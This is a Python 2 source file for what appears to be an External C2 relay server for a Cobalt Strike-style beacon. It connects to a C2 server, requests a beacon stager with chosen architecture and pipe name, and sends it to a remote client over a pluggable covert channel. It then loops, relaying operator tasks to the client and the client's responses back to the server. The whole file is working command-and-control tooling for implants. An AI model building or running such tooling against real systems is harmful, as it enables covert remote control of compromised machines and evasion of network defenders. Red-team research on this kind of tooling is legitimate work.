import socket
import struct
from time import sleep
import sys
import argparse


# TODO: Patch in startup sanity checks:
#	* Parse a config that instructs how to:
#		- transmit/recieve data via a covert channel
#		- encode/decode data
#	* Config can also store basic info such as c2 server connection, stager options, and server/covert channel polling refresh time
#	* On start: First thing we should do is wait/confirm that we have a connection from the client and that it is ready to recieve a stager or tasks.

# Basic order of operations for a new client:
#	* Once a confirmation from the client is recieved, retrieve the stager, and ensure that the stager is properly configured for transmission via the covert channel
#	* Recieve a confirmation that the stager is running and properly configured from the client, and ready to recieve tasks
#		- Client can send out some basic info about the machine it's running on. I don't care.t
#	* Poll c2 server for new tasks
#	* Relay new task to c2 client via covert channel
#	* Await a response from c2 client via covert channel
#	* Relay response to the c2 server
#	* Poll c2 server for new tasks
#	* ???
#	* Profit

# Another thing we can do is once the server and client starts (i.e. before sending a stager), we can send the C2_PIPE_NAME to the client via the covert channel. 
# The client can retrieve it via the covert channel, and enumerate the name(s) of the pipes available to it, and compare that against the given C2_PIPE_NAME.
# If a matching C2_PIPE_NAME is found on the client, notify the server via the covert channel, and both the server and client should start their respective establishedSession loop.
# This would enable us to resume a running beacon if the spec is updated to support it. Need to bring up to Mudge as a question/feature request.

# Another thing to ask Mudge would be which setup is most optimal...
#	1. Have the client push out the stager options?
#	2. Have the server push out the stager options?
#	3. Have the stager options stored in a mutual config?

# TODO: Have a proper function that reads in a config

# DEBUG: <START GHETTO CONFIG>
############################################
# Address of External c2 server
EXTERNAL_C2_ADDR = "127.0.0.1"

# Port of external c2 server
EXTERNAL_C2_PORT = "2222"

# The name of the pipe that the beacon should use
C2_PIPE_NAME = "foobar"

# A time in milliseconds that indicates how long the External C2 server should block when no new tasks are available
C2_BLOCK_TIME = 100

# Desired Architecture of the Beacon
C2_ARCH = "x86"

# How long to wait (in seconds) before polling the server for new tasks/responses
IDLE_TIME = 5

ENCODER_MODULE = "encoder_base64"
TRANSPORT_MODULE = "transport_raw_socket"

###########################################
# DEBUG: </END GHETTO CONFIG>

class commonUtils(object):
	@staticmethod
	def createSocket():
		# Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
		d = {}
		d['sock'] = socket.create_connection((EXTERNAL_C2_ADDR, int(EXTERNAL_C2_PORT)))
		d['state'] = 1
		return (d['sock'])

	@staticmethod
	def sendFrameToC2(sock, chunk):
		slen = struct.pack('<I', len(chunk))
		sock.sendall(slen + chunk)

	@staticmethod
	def recvFrameFromC2(sock):
		try:
			chunk = sock.recv(4)
		except:
			return("")
		if len(chunk) < 4:
			return()
		slen = struct.unpack('<I', chunk)[0]
		chunk = sock.recv(slen)
		while len(chunk) < slen:
			chunk = chunk + sock.recv(slen - len(chunk))
		return(chunk)

	@staticmethod
	def killSocket(sock):
		sock.close()

	@staticmethod
	def prepData(data):
		# This will prepare whatever data is given based on the config
		rdyData = encoder.encode(data)
		return rdyData

	@staticmethod
	def decodeData(data):
		# This will decode whatever data is given based on the config
		rdyData = encoder.decode(data)
		return rdyData

	@staticmethod
	def retrieveData():
		# This will retireve data via the covert channel
		# Returns unencoded data
		
		# TODO: Logic to retrieve info via the covert channel goes here, store that in data

		data = transport.retrieveData()

		if args.debug:
			print (commonUtils.color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)

		# Prepare the recieved data by running it through the decoder
		preped_data = commonUtils.decodeData(data)

		return preped_data

	@staticmethod
	def sendData(data):
		# This will upload the data via the covert channel
		# returns a confirmation that the data has been sent
		
		if args.debug:
			print (commonUtils.color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
		# Prepares the data to be sent via the covert channel
		preped_data = commonUtils.prepData(data)

		transport.sendData(preped_data)

	@staticmethod
	def color(string, status=True, warning=False, bold=True, yellow=False):
		""" 
		Change text color for the terminal, defaults to green

		Set "warning=True" for red
		"""

		attr = []

		if status:
			# green
			attr.append('32')
		if warning:
			# red
			attr.append('31')
		if bold:
			attr.append('1')
		if yellow:
			attr.append('33')
		return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

	# TODO: add a function that handles logic for when a session exits to notify the c2 controller. Right now, this could/would only ever by killing the socket.
	#	if the spec ever changes to support restoration for sessions, then this can become a priority.

	@staticmethod
	def importModule(modName, modType):
		"""
		Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
		"""
		prep_global = "global " + modType
		exec(prep_global)
		importName = "import utils." + modType + "s." + modName + " as " + modType
		exec(importName, globals())


class configureStage(object):
	@staticmethod	
	def configureOptions(sock, arch, pipename, block):
		# send the options
		if args.verbose:
			print commonUtils.color("Configuring stager options")

		beacon_arch = "arch=" + str(arch)
		if args.debug:
			print commonUtils.color(beacon_arch, status=False, yellow=True)
		commonUtils.sendFrameToC2(sock, beacon_arch)

		beacon_pipename = "pipename=" + str(pipename)
		if args.debug:
			print commonUtils.color(beacon_pipename, status=False, yellow=True)
		commonUtils.sendFrameToC2(sock, beacon_pipename)

		beacon_block = "block=" + str(block)
		if args.debug:
			print commonUtils.color(beacon_block, status=False, yellow=True)
		commonUtils.sendFrameToC2(sock, beacon_block)

	@staticmethod
	def requestStager(sock):
		commonUtils.sendFrameToC2(sock, "go")

		stager_payload = commonUtils.recvFrameFromC2(sock)

		return stager_payload

	@staticmethod
	def main(sock):
		# Send options to the external_c2 server
		configureStage.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)

		if args.debug:
			print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)

		# Request stager
		stager_payload = configureStage.requestStager(sock)

		if args.debug:
			print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)

		# Prep stager payload
		if args.verbose:
			print commonUtils.color("Encoding stager payload")
		prep_stager = commonUtils.prepData(stager_payload)

		# Send stager to the client
		if args.verbose:
			print commonUtils.color("Sending stager to client")
		commonUtils.sendData(prep_stager)

		# Rrieve the metadata we need to relay back to the server
		if args.verbose:
			print commonUtils.color("Awaiting metadata response from client")
		metadata = commonUtils.retrieveData()

		# Send the metadata frame to the external_c2 server
		if args.verbose:
			print commonUtils.color("Sending metadata to c2 server")
		if args.debug:
			print (commonUtils.color("METADATA: ", status=False, yellow=True) + "%s") % (metadata)
		commonUtils.sendFrameToC2(sock, metadata)

		# Pretend we have error handling, return 0 if everything is Gucci

		return 0

class establishedSession(object):
	@staticmethod
	def checkForTasks(sock):
		"""
		Poll the c2 server for new tasks
		"""
		recvdTask = None
		while recvdTask is None:
			taskCheck = commonUtils.recvFrameFromC2(sock)

			if taskCheck == None:
				# Sleep for x amount of time. If we didn't get anything, restarts the loop
				if args.debug:
					print (commonUtils.color("NO TASK RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
				sleep(IDLE_TIME)
			else:
				# Our data is already decoded, end the loop by assining it to recvdTask
				recvdTask = taskCheck
				if args.verbose:
					print (commonUtils.color("Recieved new task from C2 server! ") + "(%s bytes)") % (str(len(recvdTask)))
				if args.debug:
					print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (recvdTask)

		return recvdTask

	#def checkForResponse(sock):
	@staticmethod
	def checkForResponse():
		"""
		Check the covert channel for a response from the client
		"""
		recvdResponse = None
		while recvdResponse is None:
			respCheck = commonUtils.retrieveData() # will already be decoded
			if respCheck == None:
				if args.debug:
					print (commonUtils.color("NO RESPONSE RECIEVED, SLEEPING FOR ", status=False, yellow=True) + "%s seconds") % (str(IDLE_TIME))
				# Sleep for x amount of time. If we didn't get anything, restart the loop
				sleep(IDLE_TIME)
			else:
				recvdResponse = respCheck
				if args.verbose:
					print (commonUtils.color("Recieved response from client! ") + "(%s bytes)") % (str(len(recvdResponse)))
				if args.debug:
					print (commonUtils.color("CLIENT RESPONSE: ", status=False, yellow=True) + "%s") % (recvdResponse)

		return recvdResponse

	@staticmethod
	def relayResponse(sock, response):
		# Relays the response from the client to the c2 server
		# 'response', will have already been decoded from 'establishedSession.checkForResponse()'
		# -- Why is this it's own function? Because I have no idea what I'm doing
		if args.debug:
			print commonUtils.color("Relaying response to c2 server", status=False, yellow=True)
		commonUtils.sendFrameToC2(sock, response)

	@staticmethod
	def relayTask(task):
		# Relays a new task from the c2 server to the client
		# 'task' will be encoded in the 'commonUtils.sendData()' function.
		if args.debug:
			print commonUtils.color("Relaying task to client", status=False, yellow=True)
		commonUtils.sendData(task)

def main():
	# Argparse for certain options
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
	parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)


	# Call arguments with args.$ARGNAME
	global args
	args = parser.parse_args()

	# Enable verbose output if debug is enabled
	if args.debug:
		args.verbose = True

	# Import our defined encoder and transport modules
	if args.verbose:
		print (commonUtils.color("Importing encoder module: ") + "%s") % (ENCODER_MODULE)
	commonUtils.importModule(ENCODER_MODULE, "encoder")
	if args.verbose:
		print (commonUtils.color("Importing transport module: ") + "%s") % (TRANSPORT_MODULE)
	commonUtils.importModule(TRANSPORT_MODULE, "transport")


	try:
		# Start with logic to setup the connection to the external_c2 server
		sock = commonUtils.createSocket()

		# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
		# Poll covert channel for 'READY2INJECT' message from client
		#	* We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
		# if args.verbose:
		#	print commonUtils.color("Client ready to recieve stager")

		# #####################

		# Prep the transport module
		transport.prepTransport()

		# Let's get the stager from the c2 server
		stager_status = configureStage.main(sock)

		if stager_status != 0:
			# Something went horribly wrong
			print commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True)
			sys.exit(1)

		# TODO: Add logic that will check and recieve confirmation from the client that it is ready to recieve and process commands
		# Poll covert channel for 'READY4CMDS' message from client

		# Now that the stager is configured, lets start our main loop
		while True:
			if args.verbose:
				print commonUtils.color("Checking the c2 server for new tasks...")

			newTask = establishedSession.checkForTasks(sock)

			# once we have a new task, lets relay that to our client
			if args.debug:
				print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
			establishedSession.relayTask(newTask)

			# Now retrieve a response from the client
			# TODO: Probably need logic to handle large/chunked responses
			if args.verbose:
				print commonUtils.color("Checking the client for a response...")
			b_response = establishedSession.checkForResponse()

			# Let's relay this response to the c2 server
			establishedSession.relayResponse(sock, b_response)

			# Restart this loop
	except KeyboardInterrupt:
		if args.debug:
			print commonUtils.color("Closing the socket to the c2 server")
		commonUtils.killSocket(sock)
		print commonUtils.color("\nExiting...", warning=True)
		sys.exit(0)

main()
